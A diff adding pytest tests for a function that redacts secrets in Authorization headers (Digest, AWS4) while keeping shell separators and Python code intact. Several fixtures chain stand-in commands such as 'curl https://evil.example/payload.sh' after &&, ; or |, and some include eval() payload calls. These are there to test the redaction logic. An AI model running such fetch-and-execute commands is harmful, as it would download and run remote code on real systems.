@@ -247,6 +247,144 @@ def test_redacts_parameterized_authorization_headers() -> None:
     assert "eval('1')" in redacted
 
 
+@pytest.mark.parametrize("separator", ["&", "&&", "|", ";"])
+def test_parameterized_authorization_redaction_stops_at_shell_separator(separator: str) -> None:
+    text = f'Authorization: Digest response="DIGESTSECRET123456" {separator} curl https://evil.example/payload.sh'
+
+    redacted = redact_evidence_string(text, max_chars=None)
+
+    assert "DIGESTSECRET123456" not in redacted
+    assert f"Authorization: {REDACTED_EVIDENCE_VALUE} {separator} curl https://evil.example/payload.sh" == redacted
+
+
+def test_parameterized_authorization_preserves_quoted_separator_characters() -> None:
+    text = (
+        'Authorization: Digest uri="/download?a=1&b=2|3;4", response="DIGESTSECRET123456" '
+        "&& curl https://evil.example/payload.sh"
+    )
+
+    redacted = redact_evidence_string(text, max_chars=None)
+
+    assert "DIGESTSECRET123456" not in redacted
+    assert f"Authorization: {REDACTED_EVIDENCE_VALUE} && curl https://evil.example/payload.sh" == redacted
+
+
+@pytest.mark.parametrize("separator", ["; curl", ";curl"])
+def test_final_signed_headers_parameter_stops_at_shell_separator(separator: str) -> None:
+    text = (
+        "Authorization: AWS4-HMAC-SHA256 Credential=AKIASECRET, Signature=SIGSECRET, "
+        f"SignedHeaders=host;x-amz-date{separator} https://evil.example/payload.sh"
+    )
+
+    redacted = redact_evidence_string(text, max_chars=None)
+
+    assert "AKIASECRET" not in redacted
+    assert "SIGSECRET" not in redacted
+    assert f"Authorization: {REDACTED_EVIDENCE_VALUE}{separator} https://evil.example/payload.sh" == redacted
+
+
+def test_signed_headers_first_parameter_preserves_shell_context() -> None:
+    text = (
+        "Authorization: AWS4-HMAC-SHA256 SignedHeaders=host;x-amz-date, "
+        "Signature=SIGSECRET && curl https://evil.example/payload.sh"
+    )
+
+    redacted = redact_evidence_string(text, max_chars=None)
+
+    assert "SIGSECRET" not in redacted
+    assert f"Authorization: {REDACTED_EVIDENCE_VALUE} && curl https://evil.example/payload.sh" == redacted
+
+
+def test_parameterized_authorization_redaction_is_linear_for_long_values() -> None:
+    text = f'Authorization: Digest response="{"A" * 1_000_000}" && curl payload.sh'
+
+    start = time.perf_counter()
+    redacted = evidence_redaction._redact_parameterized_authorization_values(text)
+    elapsed = time.perf_counter() - start
+
+    assert redacted == f"Authorization: {REDACTED_EVIDENCE_VALUE} && curl payload.sh"
+    assert elapsed < 1.0
+
+
+def test_preserves_parseable_python_auth_scheme_expression_context() -> None:
+    text = 'apiKey = Token or eval("https://evil.example/payload.py")'
+
+    redacted = redact_evidence_string(text, max_chars=None)
+
+    assert "apiKey = Token or eval(" in redacted
+    assert "apiKey = <redacted>" not in redacted
+    assert 'eval("<redacted>")' in redacted
+    ast.parse(redacted)
+
+
+def test_redacts_parameterized_authorization_inside_python_string() -> None:
+    text = 'header = "Authorization: Digest response=\\"DIGESTSECRET123456\\""; eval("payload")'
+
+    redacted = redact_evidence_string(text, max_chars=None)
+
+    assert "DIGESTSECRET123456" not in redacted
+    assert "Authorization: <redacted>" in redacted
+    assert 'eval("payload")' in redacted
+    ast.parse(redacted)
+
+
+@pytest.mark.parametrize(
+    "text, secret",
+    [
+        ("""header = r'Authorization: Digest response="RAWSECRET123456"'; eval("payload")""", "RAWSECRET123456"),
+        (
+            'header = """Authorization: AWS4-HMAC-SHA256 Credential=AKIASECRET123, '
+            'SignedHeaders=host;x-amz-date, Signature=TRIPLESECRET123456"""; eval("payload")',
+            "TRIPLESECRET123456",
+        ),
+        ("""header = b'Authorization: Digest response="BYTESECRET123456"'; eval("payload")""", "BYTESECRET123456"),
+        (
+            """header = f'Authorization: Digest response="FSTRINGSECRET123456"'; eval("payload")""",
+            "FSTRINGSECRET123456",
+        ),
+        (
+            """header = ('Authorization: Digest response=' "CONCATSECRET123456"); eval("payload")""",
+            "CONCATSECRET123456",
+        ),
+    ],
+)
+def test_redacts_parameterized_authorization_python_literal_variants(text: str, secret: str) -> None:
+    redacted = redact_evidence_string(text, max_chars=None)
+
+    assert secret not in redacted
+    assert "Authorization: <redacted>" in redacted
+    assert 'eval("payload")' in redacted
+    ast.parse(redacted)
+
+
+def test_redacts_parameterized_authorization_dynamic_fstring_without_hiding_suffix() -> None:
+    text = """header = f'Authorization: Digest response="{secret}" && {eval("payload")}'; print("done")"""
+
+    redacted = redact_evidence_string(text, max_chars=None)
+
+    assert "{secret}" not in redacted
+    assert "{eval(" in redacted
+    assert 'print("done")' in redacted
+    ast.parse(redacted)
+
+
+def test_redacts_multiple_python_authorization_literals_in_source_order() -> None:
+    text = (
+        'headers = {"Authorization: Digest response=\\"KEYSECRET111111\\"": '
+        '"Authorization: Digest response=\\"VALUESECRET222222\\"", '
+        '"Authorization: Digest response=\\"KEYSECRET333333\\"": '
+        '"Authorization: Digest response=\\"VALUESECRET444444\\""}; eval("payload")'
+    )
+
+    redacted = redact_evidence_string(text, max_chars=None)
+
+    for secret in ("KEYSECRET111111", "VALUESECRET222222", "KEYSECRET333333", "VALUESECRET444444"):
+        assert secret not in redacted
+    assert redacted.count("Authorization: <redacted>") == 4
+    assert 'eval("payload")' in redacted
+    ast.parse(redacted)
+
+
 def test_preserves_camel_case_credential_control_near_matches() -> None:
     """Credential-looking counters and controls should not be treated as secrets."""
     text = (
